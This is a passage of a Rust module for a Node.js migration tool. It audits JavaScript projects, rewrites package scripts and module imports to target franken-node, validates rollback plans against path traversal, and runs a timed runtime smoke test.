//! Migration admission/progression controls.
//!
//! This module hosts deterministic migration policy gates used to decide
//! whether topology risk deltas are acceptable before and during rollout.

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::fmt::Write as _;
use std::io::{self, Read};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Output, Stdio};
use std::sync::mpsc::{self, Receiver};
use std::thread;
use std::time::{Duration, Instant};
use tree_sitter::{Language, Node, Parser as JsParser};

#[cfg(unix)]
use std::os::unix::process::CommandExt;

#[cfg(any(test, feature = "admin-tools"))]
#[allow(dead_code)]
pub mod bpet_migration_gate;
#[cfg(any(test, feature = "admin-tools"))]
#[allow(dead_code)]
pub mod dgis_migration_gate;

const MAX_FINDINGS_PER_CATEGORY: usize = 16;
const MAX_PROJECT_FILES: usize = 100_000;
const MAX_PENDING_DIRS: usize = 10_000;
const MAX_TOTAL_FINDINGS: usize = 1_000;
const MIGRATION_BACKUP_DIR: &str = ".migrate-backup";
const MIGRATION_VALIDATE_RUNTIME_TIMEOUT: Duration = Duration::from_secs(10);
const MIGRATION_RUNTIME_SMOKE_OUTPUT_HASH_DOMAIN: &[u8] =
    b"franken-node/migrate-validate-runtime-smoke/output-sha256/v1:";
const MIGRATION_RUNTIME_SMOKE_STDOUT_FIELD: &[u8] = b"stdout";
const MIGRATION_RUNTIME_SMOKE_STDERR_FIELD: &[u8] = b"stderr";
const MIGRATION_RUNTIME_PIPE_DRAIN_TIMEOUT: Duration = Duration::from_millis(500);
const MIGRATION_RUNTIME_PROCESS_KILL_GRACE: Duration = Duration::from_millis(50);

/// Push item to vector with capacity bounds checking to prevent memory exhaustion.
fn push_bounded<T>(vec: &mut Vec<T>, item: T, max_cap: usize) {
    if max_cap == 0 {
        vec.clear();
        return;
    }
    if vec.len() >= max_cap {
        let overflow = vec.len().saturating_sub(max_cap).saturating_add(1);
        vec.drain(0..overflow.min(vec.len()));
    }
    vec.push(item);
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AuditOutputFormat {
    Json,
    Text,
    Sarif,
}

impl AuditOutputFormat {
    pub fn parse(raw: &str) -> Result<Self, String> {
        match raw.trim().to_ascii_lowercase().as_str() {
            "json" => Ok(Self::Json),
            "text" => Ok(Self::Text),
            "sarif" => Ok(Self::Sarif),
            other => Err(format!(
                "unsupported migrate audit format `{other}`; expected one of: json, text, sarif"
            )),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ValidateOutputFormat {
    Json,
    Text,
}

impl ValidateOutputFormat {
    pub fn parse(raw: &str) -> Result<Self, String> {
        match raw.trim().to_ascii_lowercase().as_str() {
            "json" => Ok(Self::Json),
            "text" => Ok(Self::Text),
            other => Err(format!(
                "unsupported migrate validate format `{other}`; expected one of: json, text"
            )),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationSeverity {
    Info,
    Low,
    Medium,
    High,
}

impl MigrationSeverity {
    const fn rank(self) -> u8 {
        match self {
            Self::High => 4,
            Self::Medium => 3,
            Self::Low => 2,
            Self::Info => 1,
        }
    }

    const fn as_sarif_level(self) -> &'static str {
        match self {
            Self::High => "error",
            Self::Medium | Self::Low => "warning",
            Self::Info => "note",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationCategory {
    Project,
    Dependencies,
    Scripts,
    Runtime,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditFinding {
    pub id: String,
    pub category: MigrationCategory,
    pub severity: MigrationSeverity,
    pub message: String,
    pub path: Option<String>,
    pub recommendation: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditSummary {
    pub files_scanned: usize,
    pub js_files: usize,
    pub ts_files: usize,
    pub package_manifests: usize,
    pub risky_scripts: usize,
    pub lockfiles: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub summary: MigrationAuditSummary,
    pub findings: Vec<MigrationAuditFinding>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationRewriteAction {
    PinNodeEngine,
    RewritePackageScript,
    RewriteCommonJsRequire,
    RewriteEsmImport,
    ModuleGraphDiscovery,
    ManualModuleReview,
    ManualScriptReview,
    ManifestReadError,
    ManifestParseError,
    NoPackageManifest,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRewriteEntry {
    pub id: String,
    pub path: Option<String>,
    pub action: MigrationRewriteAction,
    pub detail: String,
    pub applied: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRollbackEntry {
    pub path: String,
    pub original_content: String,
    pub rewritten_content: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRewriteReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub apply_mode: bool,
    pub package_manifests_scanned: usize,
    pub rewrites_planned: usize,
    pub rewrites_applied: usize,
    pub manual_review_items: usize,
    pub entries: Vec<MigrationRewriteEntry>,
    pub rollback_entries: Vec<MigrationRollbackEntry>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRollbackPlan {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub apply_mode: bool,
    pub entry_count: usize,
    pub entries: Vec<MigrationRollbackEntry>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRollbackValidationPolicy {
    pub max_entries: usize,
    pub max_content_bytes_per_entry: usize,
    pub allow_absolute_paths: bool,
}

impl Default for MigrationRollbackValidationPolicy {
    fn default() -> Self {
        Self {
            max_entries: MAX_TOTAL_FINDINGS,
            max_content_bytes_per_entry: 1024 * 1024,
            allow_absolute_paths: false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, thiserror::Error)]
pub enum MigrationRollbackValidationError {
    #[error("unsupported migration rollback schema version `{found}`")]
    UnsupportedSchemaVersion { found: String },
    #[error("migration rollback entry_count mismatch: declared={declared} actual={actual}")]
    EntryCountMismatch { declared: usize, actual: usize },
    #[error("migration rollback entry count {actual} exceeds policy limit {max}")]
    TooManyEntries { actual: usize, max: usize },
    #[error("migration rollback entry {index} has an empty path")]
    EmptyPath { index: usize },
    #[error("migration rollback entry {index} uses an absolute path: {path}")]
    AbsolutePath { index: usize, path: String },
    #[error("migration rollback entry {index} contains unsafe path separator: {path}")]
    UnsafePathSeparator { index: usize, path: String },
    #[error("migration rollback entry {index} contains parent traversal: {path}")]
    ParentTraversal { index: usize, path: String },
    #[error(
        "migration rollback entry {index} content bytes {content_bytes} exceed policy limit {max}"
    )]
    EntryContentTooLarge {
        index: usize,
        content_bytes: usize,
        max: usize,
    },
}

#[must_use]
pub fn default_rollback_validation_policy() -> MigrationRollbackValidationPolicy {
    MigrationRollbackValidationPolicy::default()
}

pub fn validate_rollback_plan(
    plan: &MigrationRollbackPlan,
    policy: &MigrationRollbackValidationPolicy,
) -> Result<(), MigrationRollbackValidationError> {
    if plan.schema_version != "1.0.0" {
        return Err(MigrationRollbackValidationError::UnsupportedSchemaVersion {
            found: plan.schema_version.clone(),
        });
    }

    if plan.entry_count != plan.entries.len() {
        return Err(MigrationRollbackValidationError::EntryCountMismatch {
            declared: plan.entry_count,
            actual: plan.entries.len(),
        });
    }

    if plan.entries.len() > policy.max_entries {
        return Err(MigrationRollbackValidationError::TooManyEntries {
            actual: plan.entries.len(),
            max: policy.max_entries,
        });
    }

    for (index, entry) in plan.entries.iter().enumerate() {
        validate_rollback_entry(index, entry, policy)?;
    }

    Ok(())
}

fn validate_rollback_entry(
    index: usize,
    entry: &MigrationRollbackEntry,
    policy: &MigrationRollbackValidationPolicy,
) -> Result<(), MigrationRollbackValidationError> {
    if entry.path.trim().is_empty() {
        return Err(MigrationRollbackValidationError::EmptyPath { index });
    }

    if !policy.allow_absolute_paths && rollback_path_is_absolute(&entry.path) {
        return Err(MigrationRollbackValidationError::AbsolutePath {
            index,
            path: entry.path.clone(),
        });
    }

    if rollback_path_has_unsafe_separator(&entry.path) {
        return Err(MigrationRollbackValidationError::UnsafePathSeparator {
            index,
            path: entry.path.clone(),
        });
    }

    if rollback_path_has_parent_traversal(&entry.path) {
        return Err(MigrationRollbackValidationError::ParentTraversal {
            index,
            path: entry.path.clone(),
        });
    }

    let content_bytes = entry
        .original_content
        .len()
        .saturating_add(entry.rewritten_content.len());
    if content_bytes > policy.max_content_bytes_per_entry {
        return Err(MigrationRollbackValidationError::EntryContentTooLarge {
            index,
            content_bytes,
            max: policy.max_content_bytes_per_entry,
        });
    }

    Ok(())
}

fn rollback_path_is_absolute(path: &str) -> bool {
    Path::new(path).is_absolute()
        || path.starts_with('\\')
        || path
            .as_bytes()
            .get(1)
            .is_some_and(|separator| *separator == b':')
}

fn rollback_path_has_unsafe_separator(path: &str) -> bool {
    path.contains('\\')
}

fn rollback_path_has_parent_traversal(path: &str) -> bool {
    path.split(['/', '\\']).any(|segment| segment == "..")
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MigrationValidateStatus {
    Pass,
    Fail,
}

impl MigrationValidateStatus {
    const fn as_str(self) -> &'static str {
        match self {
            Self::Pass => "PASS",
            Self::Fail => "FAIL",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationValidationCheck {
    pub id: String,
    pub passed: bool,
    pub message: String,
    pub remediation: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationValidateReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub status: MigrationValidateStatus,
    pub checks: Vec<MigrationValidationCheck>,
    pub blocking_findings: Vec<MigrationAuditFinding>,
    pub warning_findings: Vec<MigrationAuditFinding>,
}

impl MigrationValidateReport {
    #[must_use]
    pub const fn is_pass(&self) -> bool {
        matches!(self.status, MigrationValidateStatus::Pass)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct MigrationRuntimeSmokeReceipt {
    schema_version: String,
    runtime: String,
    target: String,
    exit_code: i32,
    stdout_sha256: String,
    stderr_sha256: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct MigrationRuntimeSmokeTarget {
    working_dir: PathBuf,
    entry_path: PathBuf,
    display: String,
}

struct RuntimeSmokePipeReader {
    label: &'static str,
    receiver: Receiver<io::Result<Vec<u8>>>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum MigrationRuntimeTarget {
    FrankenNode(PathBuf),
    Node(PathBuf),
    Bun(PathBuf),
}

impl MigrationRuntimeTarget {
    const fn label(&self) -> &'static str {
        match self {
            Self::FrankenNode(_) => "franken-node",
            Self::Node(_) => "node",
            Self::Bun(_) => "bun",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ScriptFindingKind {
    Risky,
    MissingNodeEngine,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PackageScriptRuntime {
    Node,
    Bun,
    FrankenNode,
}

impl PackageScriptRuntime {
    const fn as_str(self) -> &'static str {
        match self {
            Self::Node => "node",
            Self::Bun => "bun",
            Self::FrankenNode => "franken-node",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PackageScriptRewrite {
    script_name: String,
    runtime: PackageScriptRuntime,
    entry_path: String,
    original_command: String,
    rewritten_command: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PackageScriptShellTokenKind {
    Word,
    AndIf,
    OrIf,
    Sequence,
    Pipe,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PackageScriptShellToken {
    kind: PackageScriptShellTokenKind,
    raw: String,
    unquoted: String,
    start: usize,
    end: usize,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PackageScriptCommandMatch {
    runtime: PackageScriptRuntime,
    runtime_start: usize,
    runtime_end: usize,
    entry_path: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SourceModuleFormat {
    CommonJs,
    Esm,
}

fn ensure_migration_project_path(project_path: &Path, operation: &str) -> anyhow::Result<()> {
    if !project_path.exists() {
        anyhow::bail!(
            "migration {operation} target does not exist: {}",
            project_path.display()
        );
    }
    if !project_path.is_dir() {
        anyhow::bail!(
            "migration {operation} target must be a directory: {}",
            project_path.display()
        );
    }
    Ok(())
}

pub fn run_audit(project_path: &Path) -> anyhow::Result<MigrationAuditReport> {
    ensure_migration_project_path(project_path, "audit")?;

    let files: Vec<PathBuf> = collect_project_files(project_path)?;
    let mut findings = Vec::new();
    let mut summary = MigrationAuditSummary {
        files_scanned: 0,
        js_files: 0,
        ts_files: 0,
        package_manifests: 0,
        risky_scripts: 0,
        lockfiles: Vec::new(),
    };
    let mut lockfiles = BTreeSet::new();
    let mut scripts_flagged = 0_usize;
    let mut engine_gaps = 0_usize;

    for path in files {
        summary.files_scanned = summary.files_scanned.saturating_add(1);
        let relative_path = relative_display(project_path, &path);

        if let Some(name) = path.file_name().and_then(std::ffi::OsStr::to_str) {
            if is_lockfile(name) {
                lockfiles.insert(relative_path.clone());
            }
            if name == "package.json" {
                summary.package_manifests = summary.package_manifests.saturating_add(1);
                inspect_package_manifest(
                    &path,
                    &relative_path,
                    &mut findings,
                    &mut scripts_flagged,
                    &mut engine_gaps,
                );
            }
        }

        if let Some(ext) = path.extension().and_then(std::ffi::OsStr::to_str) {
            match ext.to_ascii_lowercase().as_str() {
                "js" | "cjs" | "mjs" | "jsx" => {
                    summary.js_files = summary.js_files.saturating_add(1)
                }
                "ts" | "tsx" => summary.ts_files = summary.ts_files.saturating_add(1),
                _ => {}
            }
        }
    }

    summary.risky_scripts = scripts_flagged;
    summary.lockfiles = lockfiles.into_iter().collect();
    append_summary_findings(&summary, engine_gaps, &mut findings);
    sort_and_assign_ids(&mut findings);

    Ok(MigrationAuditReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        summary,
        findings,
    })
}

pub fn render_audit_report(
    report: &MigrationAuditReport,
    format: AuditOutputFormat,
) -> anyhow::Result<String> {
    match format {
        AuditOutputFormat::Json => serde_json::to_string_pretty(report)
            .map_err(|err| anyhow::anyhow!("failed to serialize migration audit JSON: {err}")),
        AuditOutputFormat::Text => Ok(render_human_audit_report(report)),
        AuditOutputFormat::Sarif => render_sarif(report),
    }
}

pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<MigrationRewriteReport> {
    ensure_migration_project_path(project_path, "rewrite")?;

    let files: Vec<PathBuf> = collect_project_files(project_path)?;
    let mut package_manifests_scanned = 0_usize;
    let mut rewrites_planned = 0_usize;
    let mut rewrites_applied = 0_usize;
    let mut manual_review_items = 0_usize;
    let mut entries = Vec::new();
    let mut rollback_entries = Vec::new();

    for path in files {
        let relative_path = relative_display(project_path, &path);
        let is_package_manifest = path
            .file_name()
            .and_then(std::ffi::OsStr::to_str)
            .is_some_and(|name| name == "package.json");

        if is_package_manifest {
            package_manifests_scanned = package_manifests_scanned.saturating_add(1);
            let raw = match std::fs::read_to_string(&path) {
                Ok(content) => content,
                Err(err) => {
                    manual_review_items = manual_review_items.saturating_add(1);
                    push_bounded(
                        &mut entries,
                        MigrationRewriteEntry {
                            id: String::new(),
                            path: Some(relative_path),
                            action: MigrationRewriteAction::ManifestReadError,
                            detail: format!("unable to read package manifest: {err}"),
                            applied: false,
                        },
                        MAX_TOTAL_FINDINGS,
                    );
                    continue;
                }
            };

            let mut manifest = match serde_json::from_str::<serde_json::Value>(&raw) {
                Ok(value) => value,
                Err(err) => {
                    manual_review_items = manual_review_items.saturating_add(1);
                    push_bounded(
                        &mut entries,
                        MigrationRewriteEntry {
                            id: String::new(),
                            path: Some(relative_path),
                            action: MigrationRewriteAction::ManifestParseError,
                            detail: format!("package manifest JSON parse failed: {err}"),
                            applied: false,
                        },
                        MAX_TOTAL_FINDINGS,
                    );
                    continue;
                }
            };

            for script_name in collect_risky_script_names(&manifest) {
                manual_review_items = manual_review_items.saturating_add(1);
                push_bounded(
                    &mut entries,
                    MigrationRewriteEntry {
                        id: String::new(),
                        path: Some(relative_path.clone()),
                        action: MigrationRewriteAction::ManualScriptReview,
                        detail: format!("script `{script_name}` requires manual hardening review"),
                        applied: false,
                    },
                    MAX_TOTAL_FINDINGS,
                );
            }

            let script_rewrites = collect_package_script_rewrites(&manifest);
            let engine_pin_changed = ensure_node_engine_pin(&mut manifest);
            let package_script_rewrite_count =
                apply_package_script_rewrites(&mut manifest, &script_rewrites);
            let manifest_changed = engine_pin_changed || package_script_rewrite_count > 0;

            for script_rewrite in &script_rewrites {
                if let Some(graph_entry) =
                    build_module_graph_entry(project_path, &path, &relative_path, script_rewrite)
                {
                    push_bounded(&mut entries, graph_entry, MAX_TOTAL_FINDINGS);
                }
            }

            if manifest_changed {
                rewrites_planned = rewrites_planned.saturating_add(1);
                let rewritten = serde_json::to_string_pretty(&manifest)
                    .map(|rendered| format!("{rendered}\n"))
                    .map_err(|err| {
                        anyhow::anyhow!(
                            "failed serializing rewritten package manifest {}: {err}",
                            relative_path
                        )
                    })?;

                if apply {
                    write_migration_backup(project_path, &path, &raw)?;
                    std::fs::write(&path, rewritten.as_bytes()).map_err(|err| {
                        anyhow::anyhow!(
                            "failed writing rewritten package manifest {}: {err}",
                            path.display()
                        )
                    })?;
                    rewrites_applied = rewrites_applied.saturating_add(1);
                }

                if engine_pin_changed {
                    push_bounded(
                        &mut entries,
                        MigrationRewriteEntry {
                            id: String::new(),
                            path: Some(relative_path.clone()),
                            action: MigrationRewriteAction::PinNodeEngine,
                            detail:
                                "set engines.node to >=20 <23 to reduce migration runtime drift"
                                    .to_string(),
                            applied: apply,
                        },
                        MAX_TOTAL_FINDINGS,
                    );
                }
                for script_rewrite in &script_rewrites {
                    if let Some(rewritten_command) = &script_rewrite.rewritten_command {
                        push_bounded(
                            &mut entries,
                            MigrationRewriteEntry {
                                id: String::new(),
                                path: Some(relative_path.clone()),
                                action: MigrationRewriteAction::RewritePackageScript,
                                detail: format!(
                                    "rewrote package script `{}` from `{}` runtime to `franken-node`: `{}` -> `{}`",
                                    script_rewrite.script_name,
                                    script_rewrite.runtime.as_str(),
                                    script_rewrite.original_command,
                                    rewritten_command
                                ),
                                applied: apply,
                            },
                            MAX_TOTAL_FINDINGS,
                        );
                    }
                }
                push_bounded(
                    &mut rollback_entries,
                    MigrationRollbackEntry {
                        path: relative_path,
                        original_content: raw,
                        rewritten_content: rewritten,
                    },
                    MAX_TOTAL_FINDINGS,
                );
            }
            continue;
        }

        if !is_migration_source_file(&path) {
            continue;
        }

        let raw = match std::fs::read_to_string(&path) {
            Ok(content) => content,
            Err(err) => {
                manual_review_items = manual_review_items.saturating_add(1);
                push_bounded(
                    &mut entries,
                    MigrationRewriteEntry {
                        id: String::new(),
                        path: Some(relative_path),
                        action: MigrationRewriteAction::ManualModuleReview,
                        detail: format!(
                            "unable to read JavaScript source for module rewrite: {err}"
                        ),
                        applied: false,
                    },
                    MAX_TOTAL_FINDINGS,
                );
                continue;
            }
        };

        let module_format = classify_source_module_format(project_path, &path);
        let (rewritten_content, rewrite_count, manual_findings, rewrite_action, rewrite_detail) =
            match module_format {
                SourceModuleFormat::CommonJs => {
                    let rewrite = rewrite_commonjs_requires(&raw);
                    (
                        rewrite.rewritten_content,
                        rewrite.rewrite_count,
                        rewrite.manual_findings,
                        MigrationRewriteAction::RewriteCommonJsRequire,
                        format!(
                            "rewrote {} CommonJS require/export declaration(s) to ESM syntax",
                            rewrite.rewrite_count
                        ),
                    )
                }
                SourceModuleFormat::Esm => {
                    let rewrite = rewrite_esm_imports(&raw);
                    (
                        rewrite.rewritten_content,
                        rewrite.rewrite_count,
                        rewrite.manual_findings,
                        MigrationRewriteAction::RewriteEsmImport,
                        format!(
                            "rewrote {} ESM import/export specifier(s) for runtime compatibility",
                            rewrite.rewrite_count
                        ),
                    )
                }
            };
        for detail in manual_findings {
            manual_review_items = manual_review_items.saturating_add(1);
            push_bounded(
                &mut entries,
                MigrationRewriteEntry {
                    id: String::new(),
                    path: Some(relative_path.clone()),
                    action: MigrationRewriteAction::ManualModuleReview,
                    detail,
                    applied: false,
                },
                MAX_TOTAL_FINDINGS,
            );
        }

        if rewrite_count > 0 {
            rewrites_planned = rewrites_planned.saturating_add(1);
            if apply {
                write_migration_backup(project_path, &path, &raw)?;
                std::fs::write(&path, rewritten_content.as_bytes()).map_err(|err| {
                    anyhow::anyhow!("failed writing rewritten source {}: {err}", path.display())
                })?;
                rewrites_applied = rewrites_applied.saturating_add(1);
            }

            push_bounded(
                &mut entries,
                MigrationRewriteEntry {
                    id: String::new(),
                    path: Some(relative_path.clone()),
                    action: rewrite_action,
                    detail: rewrite_detail,
                    applied: apply,
                },
                MAX_TOTAL_FINDINGS,
            );
            push_bounded(
                &mut rollback_entries,
                MigrationRollbackEntry {
                    path: relative_path,
                    original_content: raw,
                    rewritten_content,
                },
                MAX_TOTAL_FINDINGS,
            );
        }
    }

    if package_manifests_scanned == 0 {
        manual_review_items = manual_review_items.saturating_add(1);
        push_bounded(
            &mut entries,
            MigrationRewriteEntry {
                id: String::new(),
                path: None,
                action: MigrationRewriteAction::NoPackageManifest,
                detail: "no package.json files found; manifest pin rewrite unavailable".to_string(),
                applied: false,
            },
            MAX_TOTAL_FINDINGS,
        );
    }

    entries.sort_by(|left, right| {
        left.path
            .cmp(&right.path)
            .then_with(|| left.action.cmp(&right.action))
            .then_with(|| left.detail.cmp(&right.detail))
    });
    for (index, entry) in entries.iter_mut().enumerate() {
        entry.id = format!("mig-rewrite-{:03}", index.saturating_add(1));
    }

    Ok(MigrationRewriteReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        apply_mode: apply,
        package_manifests_scanned,
        rewrites_planned,
        rewrites_applied,
        manual_review_items,
        entries,
        rollback_entries,
    })
}

#[must_use]
pub fn build_rollback_plan(report: &MigrationRewriteReport) -> MigrationRollbackPlan {
    MigrationRollbackPlan {
        schema_version: "1.0.0".to_string(),
        project_path: report.project_path.clone(),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        apply_mode: report.apply_mode,
        entry_count: report.rollback_entries.len(),
        entries: report.rollback_entries.clone(),
    }
}

#[must_use]
pub fn render_rewrite_report(report: &MigrationRewriteReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate rewrite");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(
        &mut output,
        "mode: {}",
        if report.apply_mode {
            "apply"
        } else {
            "dry-run"
        }
    );
    let _ = writeln!(
        &mut output,
        "summary: manifests={} rewrites_planned={} rewrites_applied={} manual_review_items={}",
        report.package_manifests_scanned,
        report.rewrites_planned,
        report.rewrites_applied,
        report.manual_review_items
    );

    if report.entries.is_empty() {
        let _ = writeln!(&mut output, "entries: none");
        return output;
    }

    let _ = writeln!(&mut output, "entries ({}):", report.entries.len());
    for entry in &report.entries {
        let _ = writeln!(
            &mut output,
            "- [{}:{:?}] {}{} (applied={})",
            entry.id,
            entry.action,
            entry.detail,
            entry
                .path
                .as_ref()
                .map_or_else(String::new, |path| format!(" (path: {path})")),
            entry.applied
        );
    }

    output
}

fn runtime_smoke_prerequisite_failure_check() -> MigrationValidationCheck {
    MigrationValidationCheck {
        id: "mig-validate-005".to_string(),
        passed: false,
        message: "runtime smoke test skipped because static validation checks failed".to_string(),
        remediation: Some(
            "Resolve static migration validation failures before executing transformed-runtime smoke validation."
                .to_string(),
        ),
    }
}

fn runtime_smoke_validation_check(project_path: &Path) -> MigrationValidationCheck {
    match execute_migration_runtime_smoke(project_path) {
        Ok(receipt) => MigrationValidationCheck {
            id: "mig-validate-005".to_string(),
            passed: true,
            message: format!(
                "runtime smoke test passed: runtime={} target={} exit_code={} receipt_round_trip=true",
                receipt.runtime, receipt.target, receipt.exit_code
            ),
            remediation: Some(
                "Keep the transformed project executable under franken-node, node, or bun during migration rollout."
                    .to_string(),
            ),
        },
        Err(err) => MigrationValidationCheck {
            id: "mig-validate-005".to_string(),
            passed: false,
            message: format!("runtime smoke test failed: {err}"),
            remediation: Some(
                "Install franken-node/node/bun and ensure the transformed package manifest can execute the canonical smoke fixture."
                    .to_string(),
            ),
        },
    }
}

fn execute_migration_runtime_smoke(
    project_path: &Path,
) -> anyhow::Result<MigrationRuntimeSmokeReceipt> {
    let smoke_target = select_migration_runtime_smoke_target(project_path)?;
    let runtimes = resolve_migration_runtime_targets()?;
    let mut failures = Vec::new();

    for runtime in runtimes {
        match execute_migration_runtime_smoke_with_target(&runtime, &smoke_target) {
            Ok(receipt) => return Ok(receipt),
            Err(err) => failures.push(format!("{}: {err}", runtime.label())),
        }
    }

    anyhow::bail!(
        "no transformed-runtime smoke executor succeeded: {}",
        failures.join(" | ")
    )
}

fn execute_migration_runtime_smoke_with_target(
    runtime: &MigrationRuntimeTarget,
    smoke_target: &MigrationRuntimeSmokeTarget,
) -> anyhow::Result<MigrationRuntimeSmokeReceipt> {
    let mut command = match &runtime {
        MigrationRuntimeTarget::FrankenNode(path) => {
            let mut command = Command::new(path);
            command
                .arg("run")
                .arg(&smoke_target.entry_path)
                .arg("--runtime")
                .arg("auto")
                .arg("--policy")
                .arg("balanced")
                .arg("--json")
                .current_dir(&smoke_target.working_dir);
            command
        }
        MigrationRuntimeTarget::Node(path) | MigrationRuntimeTarget::Bun(path) => {
            let mut command = Command::new(path);
            command
                .arg(&smoke_target.entry_path)
                .current_dir(&smoke_target.working_dir);
            command
        }
    };

    let output = run_command_with_timeout(&mut command, MIGRATION_VALIDATE_RUNTIME_TIMEOUT)?;
    let exit_code = output
        .status
        .code()
        .ok_or_else(|| anyhow::anyhow!("runtime smoke process terminated by signal"))?;
    if !output.status.success() {
        anyhow::bail!(
            "runtime `{}` exited with code {exit_code}; stderr={}",
            runtime.label(),
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }

    if matches!(runtime, MigrationRuntimeTarget::FrankenNode(_)) {
        verify_franken_node_smoke_receipt_round_trip(&output)?;
    }

    let receipt = MigrationRuntimeSmokeReceipt {
        schema_version: "franken-node/migrate-validate-runtime-smoke/v1".to_string(),
        runtime: runtime.label().to_string(),
        target: smoke_target.display.clone(),
        exit_code,
        stdout_sha256: migration_runtime_smoke_stdout_sha256_hex(&output.stdout),
        stderr_sha256: migration_runtime_smoke_stderr_sha256_hex(&output.stderr),
    };
    verify_runtime_smoke_receipt_round_trip(&receipt)?;
    Ok(receipt)
}

fn select_migration_runtime_smoke_target(
    project_path: &Path,
) -> anyhow::Result<MigrationRuntimeSmokeTarget> {
    let manifest_path = select_smoke_package_manifest(project_path)?;
    let manifest_dir = manifest_path.parent().unwrap_or(project_path);
    let project_root = std::fs::canonicalize(project_path).map_err(|err| {
        anyhow::anyhow!(
            "failed canonicalizing migration smoke project {}: {err}",
            project_path.display()
        )
    })?;
    let manifest_dir = std::fs::canonicalize(manifest_dir).map_err(|err| {
        anyhow::anyhow!(
            "failed canonicalizing package manifest directory {}: {err}",
            manifest_dir.display()
        )
    })?;
    let manifest_path = std::fs::canonicalize(&manifest_path).map_err(|err| {
        anyhow::anyhow!(
            "failed canonicalizing package manifest {}: {err}",
            manifest_path.display()
        )
    })?;
    let manifest_raw = std::fs::read_to_string(&manifest_path).map_err(|err| {
        anyhow::anyhow!(
            "failed reading package manifest {} for runtime smoke target: {err}",
            manifest_path.display()
        )
    })?;
    let manifest: serde_json::Value = serde_json::from_str(&manifest_raw).map_err(|err| {
        anyhow::anyhow!(
            "failed parsing package manifest {} for runtime smoke target: {err}",
            manifest_path.display()
        )
    })?;

    let manifest_display = relative_display(&project_root, &manifest_path);

    for (label, entry_path) in manifest_entry_candidates(&manifest) {
        if let Some(target) = build_runtime_smoke_target(
            &project_root,
            &manifest_dir,
            &manifest_display,
            &label,
            &entry_path,
        ) {
            return Ok(target);
        }
    }

    for (script_name, script_rewrite) in preferred_script_entry_candidates(&manifest) {
        if let Some(target) = build_runtime_smoke_target(
            &project_root,
            &manifest_dir,
            &manifest_display,
            &format!("scripts.{script_name}"),
            &script_rewrite.entry_path,
        ) {
            return Ok(target);
        }
    }

    for fallback_entry in [
        "index.js",
        "index.mjs",
        "index.cjs",
        "src/index.js",
        "src/index.mjs",
        "src/index.cjs",
        "dist/index.js",
        "dist/index.mjs",
        "dist/index.cjs",
    ] {
        if let Some(target) = build_runtime_smoke_target(
            &project_root,
            &manifest_dir,
            &manifest_display,
            "default_entry",
            fallback_entry,
        ) {
            return Ok(target);
        }
    }

    anyhow::bail!(
        "no runnable JS/CJS/MJS target app entrypoint found for transformed-runtime smoke validation under {}",
        project_path.display()
    )
}

fn manifest_entry_candidates(manifest: &serde_json::Value) -> Vec<(String, String)> {
    let mut candidates = Vec::new();
    for field in ["main", "module"] {
        if let Some(entry_path) = manifest.get(field).and_then(serde_json::Value::as_str)
            && !entry_path.trim().is_empty()
        {
            push_bounded(
                &mut candidates,
                (field.to_string(), entry_path.to_string()),
